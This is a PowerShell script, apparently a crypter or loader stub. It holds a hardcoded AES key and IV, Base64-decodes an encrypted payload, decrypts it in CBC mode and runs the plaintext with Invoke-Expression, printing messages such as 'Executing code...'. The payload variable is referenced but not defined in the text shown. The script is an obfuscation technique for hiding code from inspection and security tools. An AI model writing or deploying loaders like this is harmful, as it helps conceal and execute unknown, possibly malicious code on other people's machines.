$cryptoKeyMaterial = @'
48ihm+G3krIpCS/3BZVODB3+zSrngfJVkDXDwzS9Oz8=
'@

$initializationVector = @'
o2PpmNGqHp3uuvnnr9L78w==
'@

# Custom Base64 decoder with whitespace stripping
function Decode-Base64Data
{
    param([string]$inputString)
    $processedString = $inputString -replace '\s','' -replace '-','+' -replace '_','/'
    while ($processedString.Length % 4 -ne 0) { $processedString += '=' }
    return [Convert]::FromBase64String($processedString)
}

# AES decryption processor using managed cryptography
function Invoke-AESDecryption
{
    param(
        [byte[]]$cipherData,
        [byte[]]$secretKey,
        [byte[]]$ivVector
    )

    $aes = [System.Security.Cryptography.Aes]::Create()
    $aes.Key = $secretKey
    $aes.IV = $ivVector
    $aes.Mode = [System.Security.Cryptography.CipherMode]::CBC
    $aes.Padding = [System.Security.Cryptography.PaddingMode]::PKCS7

    $decryptor = $aes.CreateDecryptor()
    $outputStream = New-Object System.IO.MemoryStream
    $cryptoStream = New-Object System.Security.Cryptography.CryptoStream($outputStream, $decryptor, [System.Security.Cryptography.CryptoStreamMode]::Write)

    try
    {
        $cryptoStream.Write($cipherData, 0, $cipherData.Length)
        $cryptoStream.FlushFinalBlock()
        $resultData = $outputStream.ToArray()
        return [System.Text.Encoding]::UTF8.GetString($resultData)
    }
    finally
    {
        $cryptoStream.Close()
        $outputStream.Close()
        $aes.Dispose()
    }
}

# Main script execution block
try
{
    Write-Host "[+] Decrypting secure payload..."

    $payloadBytes = Decode-Base64Data -inputString $encryptedPayload
    $keyBytes     = Decode-Base64Data -inputString $cryptoKeyMaterial
    $ivBytes      = Decode-Base64Data -inputString $initializationVector

    if (($payloadBytes -ne $null) -and ($keyBytes -ne $null) -and ($ivBytes -ne $null))
    {
        $decryptedScript = Invoke-AESDecryption -cipherData $payloadBytes -secretKey $keyBytes -ivVector $ivBytes

        if ($decryptedScript -ne $null)
        {
            Write-Host "[+] Decryption successful! Executing code..."
            $executionResult = Invoke-Expression $decryptedScript

            if ($executionResult -ne $null)
            {
                Write-Host "[+] Script executed successfully"
            }
        }
        else
        {
            Write-Error "[-] Decryption failed - unable to recover script"
        }
    }
    else
    {
        Write-Error "[-] Invalid cryptographic data detected"
    }
}
catch
{
    Write-Error "[-] Critical error: $($_.Exception.Message)"
    Write-Host "[!] Please check your script configuration"
}
finally
{
    Write-Host "[+] Operation completed"
}
